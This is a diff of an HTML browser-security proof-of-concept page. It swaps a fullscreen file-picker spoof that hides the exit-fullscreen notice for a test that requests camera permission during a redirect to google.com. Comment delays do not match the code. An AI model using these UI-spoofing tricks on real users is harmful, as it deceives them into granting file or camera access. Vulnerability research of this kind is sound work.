@@ -1,83 +1,54 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <title>Security Research - Fullscreen File Picker Spoof</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: white;
-        }         
-        #spoof {
-            width: 100%;
-            height: 100%;
-            display: none; /* Muncul setelah klik */
-            object-fit: cover;
-        }
-        #content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            font-family: sans-serif;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-    </style>
-    <script>
-        async function startPoC() {
-            const elem = document.documentElement;
-            const spoofImg = document.getElementById("spoof");
-            const mainContent = document.getElementById("content");
+<html lang="en">
+    <head>
+        <title>Security UI Spoof - Camera Race Test</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                font-family: sans-serif;
+                background-color: #ffffff;
+            }         
+        </style>
+        <script>
+            onclick = async () => {
+                // 1. Segera lakukan redirect ke google.com
+                window.location.href = "https://www.google.com";
 
-            // 1. Langsung masuk ke Fullscreen
-            if (elem.requestFullscreen) {
-                await elem.requestFullscreen();
-            }
+                // 2. Berikan timeout 300ms pada API Kamera (getUserMedia)
+                // Menguji apakah dialog izin kamera muncul saat halaman tujuan sedang dimuat
+                setTimeout(async () => {
+                    try {
+                        console.log("Memicu request kamera...");
+                        await navigator.mediaDevices.getUserMedia({ video: true });
+                    } catch (e) {
+                        console.log("Izin kamera gagal/diblokir: ", e.name);
+                    }
+                }, 100);
 
-            // 2. Ubah UI ke gambar spoof segera setelah fullscreen dimulai
-            mainContent.style.display = "none";
-            spoofImg.style.display = "block";
-
-            // 3. Tambahkan delay untuk memicu File Picker
-            // Delay ini krusial untuk menutupi notifikasi "Press ESC to exit fullscreen"
-            setTimeout(async () => {
+                // 3. Tetap mencoba masuk Fullscreen untuk menguji persistensi transisi
                 try {
-                    console.log("Memicu File Picker...");
-                    // Menggunakan showOpenFilePicker API
-                    await window.showOpenFilePicker();
+                    if (document.documentElement.requestFullscreen) {
+                        await document.documentElement.requestFullscreen();
+                    }
                 } catch (e) {
-                    console.error("File picker gagal atau tidak didukung di browser ini:", e);
-                    
-                    // Fallback jika showOpenFilePicker tidak didukung (beberapa browser mobile)
-                    const input = document.createElement('input');
-                    input.type = 'file';
-                    input.click();
+                    console.log("Fullscreen request failed");
                 }
-            }, 100); // Delay 1.5 detik (sesuaikan untuk menutupi notifikasi fullscreen)
-        }
-
-        window.onclick = () => {
-            startPoC();
-        };
-    </script>
-</head>  
-<body>
-    <img id="spoof" src="spoof.png.jpeg">
-
-    <div id="content">
-        <h1>Uji Coba Keamanan Browser</h1>
-        <p>Klik di mana saja untuk memulai pengujian.</p>
-        <button>Mulai Pengujian</button>
-    </div>
-</body>
+            }
+        </script>
+    </head>  
+    <body>
+        <div id="content">
+            <center>
+                <h1>Click to Test Camera Permission over Redirect</h1>
+                <p>Redirect starts immediately, Camera API delayed by 300ms.</p>
+            </center>
+        </div>
+    </body>
 </html>
